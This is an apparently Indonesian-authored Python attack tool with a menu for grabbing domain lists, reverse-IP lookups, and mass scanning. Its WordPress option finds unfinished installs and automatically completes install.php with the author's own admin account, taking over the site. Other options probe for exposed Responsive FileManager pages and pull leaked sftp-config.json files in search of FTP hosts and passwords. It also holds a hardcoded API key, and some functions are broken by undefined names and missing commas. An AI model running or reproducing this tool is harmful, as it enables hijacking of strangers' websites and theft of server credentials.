try:
	import requests as r, os, re, socket, sys
	from json import loads as jso
	from time import sleep
	from bs4 import BeautifulSoup as par
	from datetime import datetime
	from concurrent.futures import ThreadPoolExecutor as pol
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	r.packages.urllib3.disable_warnings(InsecureRequestWarning)
except Exception as ex:
	exit(" [error]=> " + str(ex))

clear = lambda: os.system("clear") if "linux" in sys.platform.lower() else os.system("cls")
header = lambda: {"User-Agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"}
save = datetime.today().strftime('%Y%m%d') + "_grabber.txt"

def Choose():
	tnya = input(" -> Mass or Single? [M/S]: ")
	while tnya not in list("MmSs"):
		print(" -> option is not available")
		tnya = input(" -> Mass or Single? [M/S]: ")
	if tnya in list("Mm"):
		while True:
			file = input(" -> insert File: ")
			try:
				cek = open(file,"r",encoding="utf-8").read().strip().split("\n")
				break
			except:
				print(" -> file not found")
		return cek
	else:
		trget = input(" -> target site/host: ")
		while trget == "":
			trget = input(" -> target site/host: ")
		return trget.split()

def writer(name, content):
	try:
		if content.strip() in open(name, "r").read():
			pass
		else:
			open(name, "a+").write(content.strip().replace("\n","")+"\n")
	except FileNotFoundError:
		open(name, "a+").write(content.strip().replace("\n","")+"\n")

class GGwp:
	def __init__(self, domain):
		self.ses = r.Session()
		self.count = 0
		self.domain = domain
	def ekse(self, link, num):
		global save
		url = link if num == 0 else link+str(num)+"/"
		cek = self.ses.get(url, headers=header())
		#while cek.status_code != 200:
		#	cek = self.ses.get(url, headers=header())
		cek = par(cek.text, "html.parser")
		tbody = cek.find("tbody")
		for hrf in tbody.find_all("a"):
			for x in list("🌝🌚"):
				print("\r  ["+x+"] Collect "+str(self.count)+" Domain.. ", end="")
				sleep(0.01)
			self.count += 1
			open(save, "a+").write(hrf.text.strip()+"\n")
	def proses_top(self):
		urls = "https://www.topsitessearch.com/domains/"+self.domain+"/"
		with pol(max_workers=10) as sub:
			for x in range(500):
				sub.submit(self.ekse, urls, x)
	def proses_best(self):
		urls = "https://bestwebsiterank.com/domains/"+self.domain+"/"
		with pol(max_workers=10) as sub:
			for x in range(1000):
				sub.submit(self.ekse, urls, x)
	def Running(self):
		self.proses_top()
		self.proses_best()

class Grabber:
	def __init__(self, domain):
		self.ses = r.Session()
		self.count = 0
		self.domain = domain[1:] if domain.startswith(".") else domain
	def Shopify(self):
		global save
		urls = "https://onshopify.com/domain-zone/"+self.domain+"/"
		for x in range(3):
			cek = self.ses.get(urls+str(x), headers=header())
			while cek.status_code != 200:
				cek = self.ses.get(urls+str(x), headers=header())
			pars = par(cek.text, "html.parser")
			for onol in pars.find_all("button", {"class": "btn btn-default pull-left"}):
				for x in list("🌝🌚"):
					print("\r  ["+x+"] Collect "+str(self.count)+" Domain.. ", end="")
					sleep(0.01)
				self.count += 1
				open(save, "a+").write(onol.text.strip()+"\n")
	def Pluginu(self):
		global save
		urls = "https://pluginu.com/domain-zone/"+self.domain+"/"
		for x in range(3):
			cek = self.ses.get(urls+str(x), headers=header())
			while cek.status_code != 200:
				cek = self.ses.get(urls+str(x), headers=header())
			pars = par(cek.text, "html.parser")
			for onol in pars.find_all("button", {"class": "btn btn-default pull-left"}):
				for x in list("🌝🌚"):
					print("\r  ["+x+"] Collect "+str(self.count)+" Domain.. ", end="")
					sleep(0.01)
				self.count += 1
				open(save, "a+").write(onol.text.strip()+"\n")
	def Urlwebs(self, page):
		global save
		urls = "https://urlwebsite.com/id?page="
		cek = par(self.ses.get(urls+str(page), headers=header()).text, "html.parser")
		for a in cek.find_all("img", {"class":"img-thumbnail website_ico"}):
			for x in list("🌝🌚"):
				print("\r  ["+x+"] Collect "+str(self.count)+" Domain.. ", end="")
				sleep(0.01)
			self.count += 1
			open(save, "a+").write(a.get("alt").strip()+"\n")
	def Builw(self, page):
		global save
		urls = "https://builtwith.com/top-sites/Indonesia"
		show = urls if page == 0 else urls+"?PAGE="+str(page)
		cek = self.ses.get(show, headers=header()).text
		reg = re.findall(r"data-domain=\"(.*?)\"\s", str(cek))
		for y in reg:
			for x in list("🌝🌚"):
				print("\r  ["+x+"] Collect "+str(self.count)+" Domain.. ", end="")
				sleep(0.01)
			self.count += 1
			open(save, "a+").write(y.strip()+"\n")
	def xplore(self):
		global save
		number = 0
		urls = "https://www.xploredomains.com/"+datetime.today().strftime('%Y-%m-%d')+"?page="
		while True:
			number += 1
			cek = par(r.get(urls+str(number), headers=header()).text, "html.parser")
			if "No domains found" in str(cek):
				break
			else:
				try:
					fns = cek.find("div", {"class":"grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4"}).findAll("a")
					ref = re.findall("<a.*?href=\"(.*?)\".*?", str(fns))
					ref = [z.replace("https://","") for z in ref]
					for y in ref:
						for x in list("🌝🌚"):
							print("\r  ["+x+"] Collect "+str(self.count)+" Domain.. ", end="")
							sleep(0.01)
						self.count += 1
						#if self.domain in y:
						open(save, "a+").write(y.strip()+"\n")
				except:
					break
	def Running(self):
		self.Shopify()
		self.Pluginu()
		with pol(max_workers=10) as sub:
			for ab in range(4350):
				sub.submit(self.Urlwebs, ab)
		with pol(max_workers=10) as sub:
			for cd in range(25):
				sub.submit(self.Builw, cd)
		self.xplore()

def reverseIP(domain, model, domen):
	app = []
	url = re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)[0]
	if len(url) == 0:
		dom = url
	else:
		try:
			dom = socket.gethostbyname(url)
		except:
			dom = url
	try:
		e = r.get("https://s98.reverseipdomain.com/?api_key=VSYM0K9AK70AC&ip="+dom+"&limit=100000").json()
		if e["status"] == 401:pass
		else:
			for x in e["result"]:
				if domen is not None:
					if any(ok in x for ok in domen):
						app.append(x)
				else:
					app.append(x)
	except:
		pass
	if len(app) == 0:pass
	else:
		for main in app:
			if model == "wp":
				checkerWP(main)
			elif model == "rfm":
				checkerRFM(main)
			elif model == "sftp":
				checkerFTP(main)

def reverseips(domain, simpan):
	url = re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)[0]
	if len(url) == 0:
		dom = url
	else:
		try:
			dom = socket.gethostbyname(url)
		except:
			dom = url
	e = r.get("https://s98.reverseipdomain.com/?api_key=VSYM0K9AK70AC&ip="+dom+"&limit=90000").json()
	if e["status"] == 401:pass
	else:
		try:
			total = e["total"]
			if int(total) == 0:
				print("  -> Reverse IP "+dom+" Result ["+str(total)+" Domain] ")
			else:
				for x in e["result"]:
					writer(simpan+".txt", x)
				print("  -> Reverse IP "+dom+" Result ["+str(total)+" Domain] ")
		except KeyError:
			print("  -> Reverse IP "+dom+" Result [Invalid Domain] ")

def checkerWP(domain):
	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	cok = r.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
	if len(fetch) == 0:fetch.append(domen)

	DIR = ["/wp", "/new", "/old", "/lama", "/baru", "/backup","/wordpress","/blog", "/test"]
	for ye in fetch:
		for yoy in DIR:
			urk = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", ye)][0]
			url = urk + yoy
			try:
				cek = r.get(url + "/wp-admin/install.php", allow_redirects=True, headers=header(), verify=False, timeout=10).text
				if "admin_password" in str(cek) or "language-continue" in str(cek) or "weblog_title" in str(cek) or "install.php?step=2" in str(cek) or 'action="?step=0"' in str(cek):
					data = {
						"weblog_title": "admin",
						"user_name": "lawlietindo15",
						"language": "", "blog_public": "0",
						"admin_password2": "solevisible",
						"admin_password": "solevisible",
						"admin_email": "lawlietindo15@gmail.com",
						"Submit": "Install WordPress"
					}
					posted = r.post(url + "/wp-admin/install.php?step=2", data=data, headers=header(), verify=False, allow_redirects=True).text
					if "/wp-login.php" in posted:
						writer("results/install.txt", url+"/wp-login.php#rizkydev@123madefaka")
						print("   +> "+url+"/wp-login.php#rizkydev@123madefaka")
					else:
						writer("results/install.txt", url+"/wp-admin/setup-config.php")
						print("   +> "+url+"/wp-admin/setup-config.php")
				else:
					print("   +> "+url)
			except:
				pass

def checkerRFM(domain):
	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	cok = ex.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
	if len(fetch) == 0:fetch.append(domen)

	DIR = ['/assets/filemanager/', '/assets/file-manager/',
		'/assets/filemanagers/', '/assets/filemanager/dialog.php',
		'/asset/filemanager/dialog.php', '/asset/filemanager/',
		'/asset/file-manager/', '/asset/filemanagers/',
		'/filemanager/', '/filemanager/dialog.php'
		'/assets/admin/js/filemanager/', '/admin/assets/filemanager/',
		'/dashboard/assets/filemanager/', '/media/filemanager/dialog.php',
		'/assets/plugins/filemanager/dialog.php',
		'/assets/admin/js/tinymce/plugins/filemanager/dialog.php',
		'/plugins/filemanager/dialog.php',
		'/plugins/filemanager/', '/filemanager/',
		'/contents/filemanager/dialog.php',
		'/templates/filemanager/dialog.php',
		'/file-manager/dialog.php', '/fileman/dialog.php',
		'/vendor/filemanager/dialog.php', '/api/vendor/filemanager/',
		'/api/vendor/filemanager/dialog.php'
	]
	for ye in fetch:
		url = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", ye)][0]
		for tuhan in DIR:
			try:
				path = url + tuhan
				cek = r.get(path, allow_redirects=True, headers=header(), verify=False, timeout=10).text
				if "Responsive FileManager" in str(cek) or "chmod_files_allowed" in str(cek) or "lang_filename" in str(cek):
					writer("results/rfm_checker.txt", path)
					print("   +> "+path)
				else:
					print("   +> "+path)
			except:
				print("   +> "+path)

def checkerFTP(domain):
	domen = [e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	cok = ex.get("https://sub-scan-api.reverseipdomain.com/?domain="+domen).text
	fetch = [x.replace("www.","") for x in jso(cok)["result"]["domains"]]
	if len(fetch) == 0:fetch.append(domen)

	#--> minimalize <----
	DIR = [
		"/sftp-config.json",
		"/ftp-config.json",
		"/config.json",
		"/.vscode/sftp.json",
		"/sftp.json",
		"/.vscode/ftp.json",
		"/ftp.json",
		"/.vscode/ftp-config.json",
		"/.vscode/sftp-config.json"
		"/vendor/.vscode/ftp.json",
		"/vendor/.vscode/sftp.json",
		"/vendor/.vscode/sftp-config.json"
		"/ftp/accounts_ftp.json", "/.vscode/sftp.json",
		"/.vscode/sftp.json.save","/.vscode/sftp.json~",
		"/.vscode/sftp-config.json","/.vscode/sftp-config.save",
		"/.vscode/sftp-config~"]
	for ye in fetch:
		url = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", ye)][0]
		for tuhan in DIR:
			try:
				path = url + tuhan
				cek = ex.get(path, allow_redirects=True, headers=header(), verify=False, timeout=10).json()
				if len(cek["host"]) != 0 and len(cek["password"]) != 0:
					writer("results/sftp.txt", path)
					print("   +> "+path)
				else:
					print("   +> "+path)
			except:
				print("   +> "+path)


def main():
	print("""
___  ___           ______ ____ _____    ____
\  \/  /  ______  /  ___// ___\\\__  \  /    \\
 >    <  /_____/  \___ \\\  \___ / __ \|   |  \\
/__/\_ \         /____  >\___  >____  /___|  /
      \/              \/     \/     \/     \/ 

    01. Grabber Domain
    02. Reverse IP
    03. Wp-config, wp-install exploit scan
    04. Responsive filemanager scanner
    05. Sftp/ftp checker
    00. Exit program
	""")
	chs = input(" -> choose: ")
	while chs == "" or not chs.isdigit():
		chs = input(" -> choose: ")
	if chs in ["0","00"]:
		exit(" -> Bye byee..\n")
	elif chs in ["1","01"]:
		filter = input(" -> Target Domain: ")
		while filter == "":
			filter = input(" -> Target Domain: ")
		print(" -> Process start, please wait..\n")
		Grabber(filter).Running()
		exit("\n -> Process done, restart please..\n")
	elif chs in ["2","02"]:
		chh = Choose()
		save = input(" -> Save result: ")
		while save == "":
			save = input(" -> Save result: ")
		simpan = save.replace(".txt","")
		print(" -> Process start, please wait..\n")
		for x in chh:
			reverseips(x, simpan)
		exit("\n -> Process done, save file: "+simpan+"\n")
	elif chs in ["3","03"]:
		chh = Choose()
		domain = input(" -> Target Domain: ")
		if domain == "":
			domen = None
		else:
			domen = domain.split(",")
		print(" -> Process start, please wait..\n")
		with pol(max_workers=20) as sub:
			for ytt in chh:
				sub.submit(reverseIP, ytt, "wp", domen)
		exit("\n -> Process done, enjoy..\n\n")
	elif chs in ["4","04"]:
		chh = Choose()
		domain = input(" -> Target Domain: ")
		if domain == "":
			domen = None
		else:
			domen = domain.split(",")
		print(" -> Process start, please wait..\n")
		with pol(max_workers=10) as sub:
			for ytt in chh:
				sub.submit(reverseIP, ytt, "rfm", domen)
		exit("\n -> Process done, enjoy..\n\n")
	elif chs in ["5","05"]:
		chh = Choose()
		domain = input(" -> Target Domain: ")
		if domain == "":
			domen = None
		else:
			domen = domain.split(",")
		print(" -> Process start, please wait..\n")
		with pol(max_workers=10) as sub:
			for ytt in chh:
				sub.submit(reverseIP, ytt, "sftp", domen)
		exit("\n -> Process done, enjoy..\n\n")

	else:
		exit(" -> option not available, restart again\n")

if __name__=="__main__":
	try:os.mkdir("results")
	except:pass
	clear()
	main()
